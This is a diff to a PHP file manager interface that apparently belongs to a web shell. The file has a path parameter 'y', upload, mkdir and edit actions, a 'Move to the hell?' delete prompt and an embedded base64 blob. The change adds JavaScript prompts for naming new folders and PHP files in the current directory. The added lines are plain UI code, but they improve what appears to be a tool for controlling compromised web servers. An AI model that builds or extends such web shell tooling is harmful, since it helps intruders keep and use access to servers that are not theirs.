@@ -317,8 +317,8 @@ $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.lo
     <td style=\"text-align:right;\">
 <a href=\"?y=$pwd&amp;x=upload\" data-no-ajax=\"true\"><img width=24px src=f7p-assets/upload.png></a>
         
-        <a href=\"?y=$pwd&amp;mkdir=new_folder\" data-no-ajax=\"true\" onclick=\"event.stopPropagation();\"><img width=24px src=f7p-assets/new-dir.png></a>
-<a href=\"?y=$pwd&amp;edit=newfile.php\" data-no-ajax=\"true\" onclick=\"event.stopPropagation();\"><img width=24px src=f7p-assets/add-file.png></a> 
+        <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();createNewFolder('".addslashes($pwd)."');\" title=\"New Folder\"><img width=24px src=f7p-assets/new-dir.png></a>
+<a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();createNewFile('".addslashes($pwd)."');\" title=\"New File\"><img width=24px src=f7p-assets/add-file.png></a> 
 
     </td>
 </tr>";
@@ -696,7 +696,23 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
         function confirmDelete(name, type) {
             return confirm('Move to the hell?\n\n' + name);
         }
+function createNewFolder(currentDir) {
+    var folderName = prompt('Enter new folder name:', 'new_folder');
+    if (folderName !== null && folderName.trim() !== '') {
+        window.location.href = '?y=' + encodeURIComponent(currentDir) + '&mkdir=' + encodeURIComponent(folderName.trim());
+    } else if (folderName === '') {
+        alert('Folder name cannot be empty!');
+    }
+}
 
+function createNewFile(currentDir) {
+    var fileName = prompt('Enter new file name:', 'newfile.php');
+    if (fileName !== null && fileName.trim() !== '') {
+        window.location.href = '?y=' + encodeURIComponent(currentDir) + '&edit=' + encodeURIComponent(currentDir + fileName.trim());
+    } else if (fileName === '') {
+        alert('File name cannot be empty!');
+    }
+}
         function toggleDropdown() {
             var menu = document.getElementById('dropdown-menu');
             if (menu) {
